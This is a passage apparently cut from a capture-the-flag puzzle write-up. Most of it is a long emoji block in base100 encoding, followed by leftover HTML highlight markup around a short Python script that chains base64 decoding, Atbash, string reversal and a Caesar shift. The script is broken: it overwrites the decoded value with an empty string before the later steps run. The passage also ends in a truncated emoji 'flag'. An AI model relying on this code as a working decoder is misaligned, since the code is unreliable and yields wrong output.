👚🐨👑👫👜🐾🐽👅👍👣👑🐧👑👌👛🐾👘🐽👑👩👙🐻👉👍👙🐾👟👩👍👡👁👂👍👍👁👌👈👣👧👣👘🐪🐹👇👎👣👍👢👋🐨👁👫👉👢👛👉👙🐾👉👧👍👤👫👮👍👣👐👯👑🐻🐹👎👄👣🐽🐫👎👢👟👆👎🐾🐼👰👘🐿👅👍👘👢🐬🐻👍👌👑👘👛🐾👍👀👋👢🐰👊👙🐾👮🐨👍🐾👯👘👋🐨👐👰👊👣👑👡👉👎👯👘👍👣👑👮👛👣👑👨👊👢👛👡👘👱👍👎👋🐨👑👎👍🐩👁👀👈👤🐰👎👘👢👁👩👍🐾🐨👎👛🐽👁👩👑🐾👟👊👘👱👍👮👍👎🐧👮👅👌🐬🐾👎👏👟👍👘🐧🐬👘👍👡🐹👎👅🐽👑👏👅👌🐰👏👉👤👉👀👑👌👚🐬👍👤🐼👯👎👡👅👎👄🐽👧👱👍🐧👛👊👉👤👉🐿👚🐾👣👊👙🐾👫🐬👍👣👚👮👜🐼🐨🐾👎👏👛👅👍👤👉👨👌👢👍👘👍🐨👉👏👅👎🐰👊👉👣👧👯👌🐩👫🐧👍🐽👑👩👎👡🐽👎👄👥👟👭👍👡👁👂👉👤👅🐽👙🐽👟👟👄👌👧👀👍👢👉🐾👎👤👍🐾👚🐼👣👋👙👎👟👋👋👋👁👦👍👍👑🐾👍👤🐽👢👄👢👑🐿👍🐩🐬👊👋👣👅🐿👘🐽👛👌👍👣👑👱👋👢👑👘👎🐼🐬👍👆👍👟👊👄🐿🐹👏👍👡👁🐫👘🐨👑👫👊👣👣👟👉🐼🐬👍👍👣👑👮👘🐽👐👮👍👋🐽👎👙🐽👁👱👎👢👌🐨👘🐼🐧👮👊👢👫👎👄👍👧👏👍👡🐽👍👜🐽👛👪👘🐽👉👠👉🐪👟👭👍👎👧👂👙🐨👛🐾👙🐿👁👏👙👤👉👎👌👤👯👮👜👣👐👰👛🐻🐹👟👘👱🐽👏👐🐧👟👪👍👎👁🐾👚🐿👁👑👍👤👉🐾👑🐻🐽👢👎👎👅🐾👑🐾👣👏👉🐩👟🐫👍🐩👫👊👈👤👍🐾👎👏👟👍👙🐾👯👦👌👤👯👮👎👍👍👨👊👤🐰👏👙🐾👉👐👋👍👟👮👋👣👑👪👚🐽👟👑👘🐩👟👃👎👍👑👂👅👤👁🐾👘🐽👧👟👄👏🐸👱👎👣👛🐫👎👤👍👍👅👍👟👢👉👣👑👦👑👎👫👘👎👍👛👌👈👤🐰👡👄👍👣🐪👋👍👟🐾👌🐩🐼👰👘🐾🐽👎👘👢🐬👭👐👌👑👩👜👌🐨👍👆👍👅👎👘🐨👦👮👍👎🐨🐫👋🐨👐👮👄👍👑👏👎🐿🐹👏👐👣👉🐾👄🐨👍🐭👉👢🐬👣👍👣👁🐨👍🐾👯👎👘👎🐼👱👈👥👟👎👍👱🐹🐫👐👡👁👆👉🐨👑👬👌👤👯👋👉🐨👁👱👍👤🐧👯👌🐨👛👪👘🐪👛👎👙👏👉👏👋👎👫👮👎🐽👐👰👜🐾🐰👎👄👌👦🐩👍👤👯🐺👎👣👑👪👚🐼👯👘👉👣👧🐿👐🐩👪🐬👍🐨👑👪👑🐾👯👟👄👎🐰🐬👍👤🐨👮👉🐨👣👏👉👏👟👏👎🐾👟👏👐👤👫👮👘🐽👍👨👋👣👅👌👄👎👯👍👌👤🐬👢👍🐽👑👪👚🐿👟👍👄👥🐹👋👍👡🐸👯👍🐨👑👨👍👣👑👠👉🐩👟🐩👎👍👛🐫👋🐨👁👩👅👍👛👘👉👥🐹👧👌👤👫👮👊👍👑👫👛🐾🐽👢👄👎👉👀👍👤👫👪👍👎👁🐿👌👥🐹👍👘👢👑👃👋👤👯👘👚👣👢👱👘🐾👣👅👍👤👮🐨👍👎👯👦👛🐨👍👪👑🐼👟👟👉👤👟👏👐👣👉🐾👋🐨👧👍👎👥👅👡👍👢👧👱👐🐧👛🐫👌🐩👁👎👊👤🐽👏👍🐼👁👩👐👡🐽👘👉🐨👅👪👙🐽👁👠👍🐩👟👑👍👤🐧👯👌👤👈👯👑🐽👛👘👉👤👉👨👋👍👛👊👄👍👍👫👜🐼🐰👟👍👢👣🐫👌🐩🐬👦👍🐨👁👪👚🐿👁👎👍🐼👧👏👐👱👁👂👉🐨👛👫👉👣👅👣👙👏👟👏👍🐨👑👦👛🐨👀👯👎👏👟👟👄🐩👉👎👐👋👅👊👎🐽👉👏👛🐿👛👋👍👣👧👀👐🐧👑👆👍🐨👐👮👍👡👍👎👍🐪👟👇👎👍👑👘👚🐩👅🐿👘🐽👧👅👙👤👞👱👍👎👧🐾👛🐨👅🐿👊👢👟👠👉👢🐬👐👌👣👍👮👌🐨👑👫👄🐿👛👣👉👋👍👀👌👣👟👦👍🐨👛🐿👘🐽👣👑👙👏👄👯👍👡🐽👪👚👣👧🐿👆👎👧👠👉👣👐👱👍🐩👫👘👋🐨👐👯👊👥👅👋👙🐾👟👏👋👎👧👎👌🐽👑🐼👉👤🐽👢👍👢👑👱👎👢👑👮👍🐨👐👯👉👡👅👎👘👢👁👟👌🐩🐨👉👜👍👉👩👎👤👟👊👙👢👁👇👍👎🐧🐨👈🐧🐨👪👎👥🐽👋👙👥🐹👪👌👤👪🐨👊🐽👑👫👅👍👛👏👉🐧👧👀👍👎👪🐬👎👤👁👌👉👥👑👑👘👢👑👟👐🐨👑🐾👛🐽👁👪👑🐼🐬👟👜👣👐🐩👍🐨👉🐺👍🐩👀👯👍👏👣👋👘🐩👟👎👐👢👛👦👍👣👑👫👜🐾🐽👅👄👍👧👐👑👌👛🐾👘👢🐨👎👎👥👣👎👉👱🐽👭👍🐾👯👘👎🐾👉🐭👈👣👛👎👉👍👧🐩👎👏👧🐾👍👤👍👎👊👣👣👠👉🐩👟👌👌👣👍👮👎🐽👛👏👜🐾🐰👌👙👍👑🐿👐👋👅👢👎🐾👁👩👅👍👟👎👙👏👉👟👋👍👑👢👚👣👑👌👉👤👟👎👘🐪🐸👯👍👍👑👦👘🐨👐👯👊👥👅👡👉👣👁👎👍👢👍👘👘🐽👢👰👚🐪👟👎👄👎👉👰👋👣👑👢👌🐩🐼👱👈👣👧👎👙👋🐹🐪👑👌👛👁👜👍👑👬👋👣👟👠👙🐼👧👇👍👤👯👘👛🐩👄👯👎👥👉👣👉🐧👑👪👐👢👑👪👅👍👧👍👘🐾👫👟👉👣👧🐧👍👎👫👦👍👢🐨👏👘🐻👅👎👄🐽👧👟👐👱🐽👢👛🐾🐽🐾👑🐾👟👟👄🐧👁👍👍👣👉🐺👐👍👣👏👋👥👅👘👊🐽👁👩👌👤👪🐨👋🐨👉👍👍👥👛👎👙🐽👣🐫👎👢👉🐺👘👌🐨👍👍👡👅👌👙🐽👑👩👍🐧👛👂👚👤👅🐿👉👣👍👎👉👏🐹👌👍👣👍👘👐👎👉🐿👍👢👣👌👘👱👣👋👐👢👛🐪👄👍👑🐿👜🐽👑👆👍🐧👑👀👌🐩👫👘👘👣👁👫👜🐾🐽👎👙🐽👧🐪👑👎👯👘👚👍👅👩👎👤👯👊👙🐿🐹👘👎👍👍👢👉🐨👌👮👄🐿👣👟👉🐽👧👏👐👣👟🐺👊🐽👛👎👎👤👫👏👉👢👧👰👎👢👛👦👌🐩🐽🐭👍👥👛👎👍👱🐸👯👌👎👪👯👚🐨👛👐👘🐽👟👠👉🐨👁👟👍👤👧🐺👍🐧🐬🐾👎👣👟👆👍👋👣👐👌👤🐨👊👊👍👧👍👐👱👍👎👙👌👍🐫👍🐩👧👆👍🐧🐨🐾👚🐽👉👎👘👢👑👩👑🐽👑👮👊🐾🐽🐾👋👤👣👊👙👏👈🐨👍👤👯👡👜🐼🐨🐽👄👌👟👊👙👢👧👆👍👤🐨👊👍👍👣👏👛🐾🐽👏👉👣👧👯👍🐾🐧🐬👍👣👁👫👜🐽👟👎👄👥👉🐪👐👢👑👂👚👢🐬👌👉👣👟👟👄👏🐹👰👎👍👍👢👉👤👈👰👋👢👛👟👉👤👉👋👐👢👑👮👎🐽👛👪👍👤🐽👋👙👍👑🐿👐🐧👍👪👍🐾👁👏👘🐽👉👌👍🐼👑👃👍👣👑👘👉🐨👑👫👉👤👫👅👍🐨👁🐭👍🐩👫👘👙🐩👁🐾👊👏👛👏👙👌👑👏👐👣👟👅👜🐽👐👮👎👤🐽👢👉👋👍👏👍🐾🐨👦👋👣👑👏👆🐿👣👏👍🐪👉👟👐👋🐽👘👛🐽👅👪👙🐾👟👋👊🐼👁👎👎👎👫👘👛🐩👍👪👎👥👉👅👍👎👉👋👐👢👑👂👜👣👛👩👑🐿👅👎👄👎👉🐾👌🐩👫🐧👍🐧🐨👎👚🐽👟👎👘👢👑👊👑👌👛👂👉🐨👧🐾👌👤👟👅👎🐼👁👘👍🐨👚👯👄🐾👈👯👑🐼👛👠👉👤👟👩👌👡🐹👘👙🐨👍👫👅👌👅👊👄👍👧👱👍👎👯👢👍🐧🐨🐼👉👣👟👑👄🐾👟👱👍👣👛👂👉🐩👅👀👊👣👧👎👙👍👁🐿👎👢👉🐾👘🐨👛👏👋👢👛👘👉🐩👯👐👌👡👁👦👅🐽👐👰👛🐽👅👉👙👍👑🐿👍🐨👟👦👍👤👁🐿👜🐾🐰👍👙👏👟🐪👍🐨👑👎👚👍👅👫👆👍👟👠👉🐨👁👑👍🐽👑👦👛🐨👉👪👎👥👅👡👉👤👟👘👐👋👁👦👌🐽👑👨👊👢👫👎👙🐾👉👱👐👌👑👮👘🐼🐨👐👈👏👧👎👉👣👑👟👑🐻🐽👘👛🐽👁👩👘🐾👫👊👙🐽👧👭👎👣👛🐧👐👍👛👎👑🐽👍👉👙👋👣👨👋👍👑👪👄🐨👉👎👘🐼👛👍👄👢👍🐬👐👌👛🐾👍🐩🐽👩👅👏👑👑👍👍👧👰👑👍👌👯👍👢🐰👎👋👣👛👟👄🐧👀🐩👍🐨👑👎👘🐩👀👯👌👥👅👘👉👍👧👌👐👢👍👮👎🐽👣👪👘🐽👅👡👙🐽👁👰👍🐩🐬👆👎🐽👁👪👊👡🐽👎👍🐪👟👏👐👌👌👯👍🐩👅🐾👙🐽👟👎👄🐨👁👰👍👣👉🐾👐👍👀👯👍👥👅👎👙🐽👁👧👍👢👛🐫👛🐨👑🐾👎👤🐽👢👄👣👑👏👍🐩👯👦👘🐨👁🐽👊👣👛👌👍👍👁🐿👍🐨👑👘👎🐾👉🐿👆👍👛👟👜👢👐👯👎👍👍👦👛🐨👛🐾👎👥👅👡👉👏👉👟👍👡👅👦👊🐽👣🐭👉👣👛👡👄👏🐹👀👐👌👛👦👙🐾👁🐾👙🐻👍👎👙👋🐽🐪👌👡🐽👪👎🐽👁👐👘🐾🐽👊👍🐩👟👐👎👍👉👂👙🐨👍👎👎👥👉👢👊🐾👉👍👋👍👑👮👄🐽👧🐽👘🐾👫👎👉👣👧🐧👍👎👯👘👍👣👑🐭👉👢👟👑👍👣👍🐫👐🐩👯👢👚👍🐽👪👑🐾👣👎👉👣👧👅👍👤👧🐺👘🐨👄👯👋👢👟👎👘🐩👉👟👌👤🐬🐺👚🐽👍👨👊👤🐰👎👍👣👧🐿👍👎👫👢👘🐧🐨👎👙🐻👉👏👘🐩👟👋👐👋🐽👁👜👣🐽👬👈👣👑👟👘🐨👧👃👎👢👉🐾👐👍👁👎👊👥👉👢👉🐩👯👆👍👤🐨🐪👜👣👑🐾👎👣👛👟👄👢👑🐾👋👌👟👪👙🐽👁👫👘🐾🐽👑👘🐨👧👃👌👋🐽👮👍👣👛👬👋👤👧👎👘🐪🐹🐭👎👋🐹👢👅🐽👌👰👊👣👛👋👘👣👑👏👐👎👫👭👄🐽👑👌👊👢👛👏👉👢🐬👰👐👢👑👂👘👍👀👰👘🐽👣👏👍🐪👟👭👍👋🐽👢👉🐨👧🐾👑🐾🐽👊👙👍👁👯👍🐽👑👢👌🐧🐨👎👍👥👉👣👉👋👣👦👍👤👫👪👅🐽👌👰👅👎🐰👎👄👌👧👱👐🐧👟👂👍🐨👑🐽👚🐽👟👑👜👢👧👃👌👡🐽👢👛🐽👁👪👋👤👯👠👎🐾👟👐👍👡🐽👘👙🐩👈👯👊👏👟👏👎🐾👟👦👋👋👁👊👍🐨👣👌👋👣👅👏👉👣👁👐👑🐼👟👢👍🐽👑👪👚🐼👣👑👄🐽👧👇👍👡🐽👑👛🐨👑👨👍👣👛👎👄🐩👟👈👍🐨👑👘👐👎👄👰👋👢👟👟👉👥🐹👆👐👤🐨👥👜👣👑👏👚🐼👛👢👄👌👣🐬👌👤👫👢👍👎🐽🐭👍👢🐰👑👙🐾👉👨👑👌👑👘👛🐼🐨👌👌👤👟👅👙🐼👐🐧👍👎👯👦👙🐩🐽👎👊👥👉👟👉👣👧👘👍👢👍👮👍🐽👐👮👎👥👅👢👉🐨👑🐾👑🐼👛👮👋👣👑👪👎👏👧👎👄👥👉👟👍🐻👁🐾👚👢🐨👎👘🐾👯👋👉🐪👟👐👍🐽👚🐨👙🐩👅👪👎👢👍👊👙👌👑👩👍👤👫👘👜👣👛👩👎👥👛👎👄👍👣🐫👌👤👧👆👍🐩🐽👩👊👤👟👍👄👡🐽👊👑👍👑👊👚👣👛👫👘🐽👅👠👘🐧👧👈👍👣👚👮👄👍🐼👮👄👏👅👏👙👢👑👌👐👤🐬🐺👚🐨👍👫👚👱🐽👋👍👣👑🐧👑🐼👛🐾👘👍👁👩👚🐻🐹👎👍🐪👄🐨👍🐩🐨👂👍👍👁👬👎👣👧👟👘🐨👧👦👎👋🐽👘👉🐩👉🐾👊👥👅👘👉👋👍👦👑👎👯👑👄👣👐👯👌👢👅👎👄👢👣🐫👍👣👟👪👍🐾🐼👰👘🐽👛👑👘🐩👉👭👍👤👯👘👛🐾👍🐿👉👢🐬👅👍👥🐹👑👎👣👍👢👉🐩🐽👩👄👍👛👏👙👤👯👏👌👡👅👦👚👣👣👍👑🐽👛👡👄👎👉👱👐👢👑👢👘🐾🐼👯👚🐻👁👏👍🐪🐹👃👌👡👁👅👜🐽👉👬👋👤👟👊👙🐿🐹👮👍👤👧👂👙🐨👛🐾👑🐽👟👣👉👱👣👍👐👣👑👘👊🐽👐👯👘🐾👫👏👉🐧👧👁👌👎🐬👂👍👍👑👪👚🐻👅👘👍👣👧🐪👌👤👯👘👍👍👁👫👘🐽👛👟👄🐧🐽🐫👍👣👑👘👙🐩🐼👯👎👏👟👋👙👢🐬👨👌👤👯👂👍🐨👑👩👍👤🐽👟👉👤👫🐬👐👱👅👦👍🐧🐨👏👌👥👣👌👙🐽👧👩👍👋👁🐽👜👣🐽👪👚🐽👛👠👍🐼🐽🐫👎👢👉🐾👎👤👍🐾👑🐿👁👘👉👤👟👧👐👋🐽👮👍👣👛👎👌👢🐰👍👄👍👧👏👍👤🐬👊👙🐽👀👮👎👥👅👑👘🐨👧👱👋👣👑👮👍👤🐽🐿👛🐾👟👊👙🐿🐸👮👍👣👛🐧👙🐨👑👩👄👍👟👟👉🐼🐬👏👋👌👑👮👐👍👧👏👜🐼👛👡👙👌👑🐿👎👢👛👦👘🐼🐧👮👊👣👁👎👙👋🐽🐪👌👡🐽👍👜👍👍👪👑🐽👛👠👘👱👍👋👎👎👫👢👌🐩👅🐾👎👥👉👢👊🐾👉👏👐👢👑👪👅🐽👛👩👌👣👅👟👍👋🐽👰👐👢👉👊👎👤🐼👯👚🐿👁👏👍👣👧👃👐👱🐽👢👚🐨👉👪👚🐾👣👊👙🐿🐹👭👍🐨👛👮👉🐨👌👯👎👏👟👡👉👎👉👍👐👢👑👂👍🐽👣👩👑🐻👅👅👍👣👧👀👑👌👑👘👋🐨👐👮👎👢👣👍👄👥👉👟👐👎👯👂👉👣👅👫👘🐽👛👠👉🐨👁👌👍👋🐹👘👐👎👄👯👑🐿👉👊👙🐾👉👆👐👏👧👎👊👍👐👰👛🐾🐽👎👄👍👣🐬👌🐩👫👪👌👤🐽👪👚🐽👟👑👙🐾👟🐻👌🐧👑👢👍🐨👛👫👛🐽👟👊👘🐪🐹🐬👎👍👍👢👛🐨👌👮👄👏👍👟👉👤👯👏👐👎👫👂👎🐽👍🐭👉👢🐰👊👄👎👉🐨👍👎🐨🐫👌🐧🐧👯👊👣🐽👎👍🐪🐹🐻👍👡🐸🐨👉🐨👛👪👘🐼🐰👎👍🐾👯👑👍👎🐧👯👌🐨👅👎👚🐽👑👑👜👣👑👏👐👣👍👎👅🐽👐👰👚🐼🐰👎👄🐻🐽🐿👐🐧👑👊👍🐩🐽👩👎👥👁👘👉👣👧🐪👌🐧👛🐾👉🐨👉👫👙🐽👅👠👎🐽🐼👯👍👤🐨🐫👘👤👍🐽👄👌👟👍👎🐾👯👌👐👋👁👊👍👍👣👫👚👱🐽👎👍👤👯👐👑🐼👛🐾👎🐽👁👪👎👡🐽👑👄🐽👑👩👍👢👑👂👚🐩👅🐾👎👣👑👅👙👣🐽🐪👍👣👉🐹👜🐾👅👩👅👍👑👟👉👥🐹👦👋👍👟🐺👄👣👑👫👚🐼👁👢👄👣👑🐿👍🐾🐬👊👌🐽👑👫👘🐾🐰👌👍👣👑🐪👌👢👑👘👉🐨👛👫👛🐽👍👠👍👣👧👀👎👋🐹👎👚🐨👑🐿👊👣👟👟👉👣👁👍👍👢👍👮👛👣👑👪👎👤🐽👊👄👍👧🐧👌👤🐨🐧👋👤🐼👯👚🐼👣👎👘👢👢👯👍👋🐽👊👚🐨👉👩👘🐾👟👊👙👍👁👎👍👤🐨🐫👍👤👍🐾👎👏👛👏👙🐿🐹👪👍👣👉👎👎🐽👑🐿👄👎🐰👌👙🐽👧👐👋🐧👟👪👎🐽👐👱👌👥🐽👌👙🐽👧👟👍👡🐽👢👛👍👉👪👘🐾👟👟👜👣👑👏👍👤🐨🐫👐👎👈👰👉👢👛👏👎🐾👉👏👍👢👍👘👎🐽👣👩👎👢👫👣👙🐾👉👰👍👣👉🐾👘🐽👁👌👈👡👅👍👄👥👈👮👍👡🐸👯👍🐩👅🐾👘🐽👛👟👘🐨👧👏👎👣👍👘👘🐩👉👎👋👥👁👆👍👤👟👋👐👢👟🐺👄👣👑👪👑🐿👛👋👄👢👣🐫👐👢👑👢👘👣👁👫👘🐿👁👍👘👢👁👟👍🐻🐽👊👍🐨👛👫👉👤👯👠👉👤👮🐨👎👣👍👢👄🐾🐽🐽👄👍👑👠👉🐼🐬👍👐👢👑👘👚👣👑👪👑🐼👫👊👄👢🐬👁👌🐩👯👢👌🐧🐧👰👘🐾🐰👎👘👢👁👩👍👎🐨👎👛🐽👉👩👑🐾🐽👊👄👥👟👑👍👎👧👂👙🐧🐬👎👎👥👁👘👉🐼👁👦👋👍👌🐨👄🐽👑👫👜🐾👫👎👙👌👧👀👑👌👟🐺👍👤👁👐👋👏👟👑👘👢👑👋👍🐧👛👎👉👤👉🐾👑🐾👣👊👄👌👧👘👍🐩👫👎👘🐧🐨🐾👎👥👁👅👍👤👉👨👌👤🐨👦👐👍👣👌👊👤🐰👍👉👣👧👯👌🐩👫🐧👍🐩👁🐿👌👡🐹👌👄👍👧👟👐👍👑👢👊🐽👦👱👚🐽👟👠👉👣👧👦👍🐨👑👘👋🐨👅🐾👎👥👁👏👙🐼👁👏👋👎🐨👦👍👍👛👎👌👢🐰👉👙👍🐽🐫👎👢👟👆👍🐩👁👍👎👤🐰👌👍👣👧👱👋👋🐽👊👍🐩🐽🐽👑🐽👛👅👘🐨👐🐩👎👍👍👢👉🐨👛👪👎👢👑👏👘👢🐬👏👌👣👑👮👄🐨👍👫👜🐾👫👡👄👏🐹👀👑🐼👑👢👋👣👅🐽👊👢👧👎👄👍👧👏👐👋👁👁👜🐽👍👬👋👤🐽👊👍👥🐹👍👎👍👛🐫👐👍👛🐾👙🐿👅👍👘🐩👉👆👋👍👑👑👄👣👍👫👛🐻🐹👟👄👌👧👱👐🐧👉🐾👍🐨👀👱👘🐽🐹👑👍👤👉🐾👑👌👛👆👉🐩👅🐾👘🐽👛👅👄👌👧🐬👍👤👯👊👊🐨👅👫👍👢👛👎👙👢🐬👦👌👡👅👦👍🐽👐👮👍👢👫👍👉👤👉👐👑🐼👛🐾👘🐧🐨👍👅👌👟👎👄👎👟👱👍🐾👯👘👎🐽👍👪👙🐽👑👟👘🐧👦👱👍👡🐹👘👍🐩👉🐿👋👢👑👇👍👤👉👏👐👢👟🐺👅👣👑👨👊👋🐽👢👄👎👉👱👍🐩👯👢👘👣👁👐👘🐾🐽👌👍👱👍👆👑👌👑👑👛🐨👑👌👍👣👛👅👘👱👍👁👎👍👍👍👄👎🐽👎👎👏👣👟👉👎👉👏👐👣👉🐾👄🐨👍👨👉👥👅👏👉👢👧👑👐👌👑👦👎🐽👀👰👘🐿👟👎👍🐪👟👟👎👍👑👍👜🐾👁👀👋👤👟👊👘👱👍👯👍👎🐨🐫👛🐧🐨🐾👚🐼👑👏👙👤👉👍👐👢👍👮👜👣👢👮👘🐾🐰👎👘👱🐽🐨👌👎👯👊👍🐩🐽👩👉👡👉👎👘👢👑👟👐🐨👑👘👚🐨👛👫👙🐽👅👅👙👎👛🐬👍👡🐽👘👘🐧🐬🐾👌👏👟👋👙👢👧👇👍👤🐨👊👘🐽👍👫👅👌👅👡👉👣👑🐧👑🐼👟👢👍🐽👑👪👚🐻🐹👘👉👎👉🐿👐👋🐸👯👎🐽👍👩👙🐽👛👠👎🐽👁🐭👍👤👯👢👊🐨👅🐾👍👥👍👉👙🐽👧👦👐👋🐽👮👋👍👑🐿👄👋👉👑👍🐧🐬👱👐👋👅👮👘🐽👀👰👜🐼🐰👎👙👏👟👘👋👌👑👘👚👍👅👨👈👣👧👎👙👍👁👁👍👎🐧🐨👋🐩🐽👪👊👥👉👟👉👤👟👘👍👢👍👘👘🐽👧👎👎👥👛👎👙🐾👉🐨👍🐾🐨👮👍🐩🐼👱👈👡👑👏👍🐼👁👩👋👢👑👍👜👍👅👪👑🐽👉👟👙🐼👧👐👎👍👛🐧👛👢🐨🐾👍👡👑👋👘🐩👉👌👌👤👪🐨👜👍👐👰👄👏👛👍👄👢👧👑👐👌👑👪👎🐽👐👱👘🐿👑👎👍🐼👑👩👌👡🐽👮👉🐨👧🐿👉👣👅👠👍👢👧🐫👍👢👑👘👘🐨👌👮👄👍👛👎👙👣👁👪👌👣👉👪👙🐨👑👫👛🐿👅👆👉👣👍🐬👋👣👚🐬👍🐧🐨👍👚🐿👧👑👄🐾👟👃👍👡🐽👘👉👤👅🐾👘🐽👧👣👘🐪🐹👄👍👎👧🐾👘🐩👉🐾👊👥👅👍👙🐼🐬👏👌👤👯👭👜👍👑👫👄🐿👛👣👉👋👍👀👍👍👟👪👍🐩👁🐿👌👤🐰👌👍🐼👧👋👍🐨👑👪👛🐼🐨👎👋👣👟👊👙🐼👧👑👎👢👍👦👘🐨👑🐾👎👥👅👡👉👎👯👘👋👌👑👮👌🐽👑👨👉👣👧👢👄👍👧👯👍👤👯👢👍🐧🐧👰👘🐽🐽👎👄👍👧👟👎👍👛👅👜👍👉👩👘🐾👟👊👙👢👁👇👎👎🐧👯👙👤👍👪👎👣👟👡👉👎👉👩👋👍👌🐨👊👍👌👰👛🐾🐰👟👍👢👧👰👋👣👑👪👍👤👁🐾👎👡👅👎👍🐼👑👟👑🐼👌👯👊👍👧🐿👜🐽👅👎👉👣👧👂👍👣👛🐫👙🐩👀👯👎👏👟👘👉👎👟👦👌👡👁👦👍🐨👣👩👑🐽👅👎👉👣👧👯👌👤🐬👆👘👤👁🐿👌👡🐽👏👘🐨👧👩👍🐾👯👑👜👤🐽🐾👑🐽👛👎👉👎🐯👮👍👢👉👂👉🐩👅👩👄👍👛👘👉🐪🐹👋👌👣👍👮👙🐨👑👫👜🐾🐽👏👙👍🐽🐫👐👢👟👂👐👍👁👐👌👣👉👌👍🐪👄👯👌👤👯👎👎🐾👍🐾👑🐽👛👅👍👥🐹🐬👎👋🐹👘👚🐨👐👰👊👣👣👉👘🐧🐬👟👍👣👑👮👋🐽👑👨👉👢🐰👢👍👣👁🐧👌👤👯👆👘👎🐼👮👚🐻👅👎👄👎👅🐫👋👌👑👅👜🐽👍👪👑🐽👟👠👙🐼👧👇👍👋🐹👢👙🐨👑👎👌👣👛👘👉👢🐬👐👌👤👯👮👄🐽👉👪👎👤👫👏👉👢👣🐪👐🐧👍👪👍🐨👑🐭👈👋🐽👎👄👥👟👟👌👤👯👢👚👍👉👪👚🐾👟👟👄👏🐹👭👍👤👧🐺👍👤👍🐾👎👣👛👎👙👣👁👦👌👣👉👎👙🐨👧👏👜🐽👛👅👄👍👧🐧👋👌👟👦👋👣👀👮👍👡👉👑👘🐨👧👩👍👢👑👢👊🐾👍🐿👆👍👑👠👙👢👁🐭👍👤🐨🐫👐👎👅👪👎👥👁👢👉👣👑👋👐👢👟🐺👎👣👛👪👍👤👫👊👄👢👑👰👋👍👑👦👘🐨👁🐾👚🐾🐽👎👙🐽👧👎👋👍👑👘👍👍👅👩👛🐽👟👎👄🐽👧👀👎👋🐹👘👘🐩🐽🐽👄👍👣👉👘👢👧👐👍👡👅🐺👋🐽👍👨👊👢🐬👣👉👣👁🐨👍🐾🐨👦👌🐧🐨👫👘🐽👑👎👍🐪👟👏👑🐻🐽👢👉🐨👧🐾👘🐾👯👊👜👤👯👎👎👎👯👘👐👍👅🐾👎👏👣👢👉👤👉👎👋👎👫👮👍🐨👐👰👅👌👛👎👍👣👧🐧👍👎👯👊👐👍👐👱👘🐿👣👘👉🐼👑🐪👌👣👑👎👛🐾🐽🐾👑🐾👟👅👄🐼👐🐧👍👤👯👘👐👎👀👰👉👏👟👘👉👎👟👌👐👋👁👊👎👍👣👫👛🐿👛👎👄👎👯👐👑🐼👛🐾👘🐽👁👫👛🐻👍👑👜👢🐬👭👍👡🐸👯👎🐽👍👨👈👣👧👟👄👏🐹👈👍👣👉👂👉👤👍👪👉👥👉👇👍👤👉👆👍👤🐬🐺👍👍👑👏👚🐼👫👍👙👍👑👏👍👎🐬👎👍👎👁🐿👘🐽👣👍👘👢👑👃👐👡🐽👘👎🐾👍🐿👆👍👑👅👘👱👍👐👎👎👫👦👋🐨👐👯👎👢👑👏👙🐽👁👍👍👤👯👮👊🐽👉👩👎👣👧👣👍👋🐽👍👌👎🐨👦👌🐩👁👀👈👏👛👎👙🐾👈👮👐👱🐽👢👊🐽👁👬👊👢🐰👎👉👋👍👐👎👍👛🐧👛🐨👅🐾👘🐪👣👣👉👋👣👩👌👡🐹👘👊🐽👢👮👑🐻👉👟👉👋🐽👑👌👎👧👎👍🐩👁👐👈👢👉👏👍👣👧👎👑👍👑👊👛👍👉👫👚🐽👅👎👄👤👟👍👍🐨👛🐧👍👢🐨👏👋👢👛👏👙👣👁👩👌🐧👛👊👎🐽👣👩👎👥👅👆👉👤👉👰👍👎👫👆👎🐾👁🐾👙🐻👉👍👙👏🐹👇👍👣👛👂👉🐩👅👀👊👣👛👅👉🐨👁👄👎👏👧🐾👋🐩👅👩👆👍👛👘👉🐩👟👆👍👤🐬🐺👋👣👑👨👉👤🐽👑👍👤👯👐👍👎👫👦👍🐩🐼👯👚🐾👟👍👙🐽👁👱👍👢👑👪👚👤🐽🐽👊👤👫👅👍🐨👁🐭👍👤🐧👯👉🐩🐽🐽👄👍👛👡👉👤👯👎👋👎🐬👊👘🐽👣👏👜🐼👫👏👉🐨👑👀👌👤👯👎👍🐨👁👌👍👢👍👏👙🐽👧👟👍👡🐽👁👜🐽👅👪👍👤👣👊👘🐨👧👏👍👤👫👊👈👢🐬👉👇👋🐧🐴</span></span><br><span class="line">flag1 = base100_decode(flag)</span><br><span class="line">flag1=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">20</span>)):</span><br><span class="line">    flag1 = base64_decode(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(atbash_cipher(flag1))</span><br><span class="line">tmp=atbash_cipher(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">21</span>)):</span><br><span class="line">    tmp = string_reverse(tmp)</span><br><span class="line">flag = caesar_decrypt(tmp, <span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag = "👍👤🐧👮👛🐩👈👰👌👏👣👍👎🐾👯👎👍🐧👛🐫👍🐨👐👮👑🐻👉👎👄👍👣🐪👎👢👉👊👍🐧🐨👎👙🐻👅👏👘🐨👁👋👍👡🐸👯👍🐩👁🐼👋👣👟👟👄👌👧👌👍👤👧🐹👜🐽👐👰👊👢👍👌👙🐾👟👦👋👍👍👮👍👍👑👫👚🐼👁👣👉👣👣🐬👌🐩👫👎👍👎👁🐿👘🐾🐰👌👍👣👑🐪👍👣👑👘👚👍🐽👫👉👣 👉👅👙🐼👧👁👍👤🐨🐧👘🐨👛🐿👊👢👛👡👉👋👣👘👍👡👅👊👉🐨👧👍👎👤🐽👢👉🐧🐬🐾👌🐩🐨🐫👌🐩👁🐿👛👱🐽👎👍🐼👦👮👍👡🐽👘👎🐽👅👩👘🐾👟👊👜👤👯👎👍👤👧👆👋🐧🐧👯👚🐽👑👏👙👌👑👩👌👡🐸🐨👉🐨👧🐽👎👣👅👌👙🐽👧👍👍👤👫👮👍🐩👁👌👉👏👛👎👘👢👑👏👑🐼👑👆 👚🐨👛👪👘🐾👣👊👄👤👟👑👍🐨👛🐫👙🐩👀👰👍👥👅👍👙🐽👑👋👐👣👍👘👚👍👑👫👛🐾🐽👅👉👣👑🐧👑👌👑👆👍👎👁👍👚🐼👛👑👄🐽👑🐪 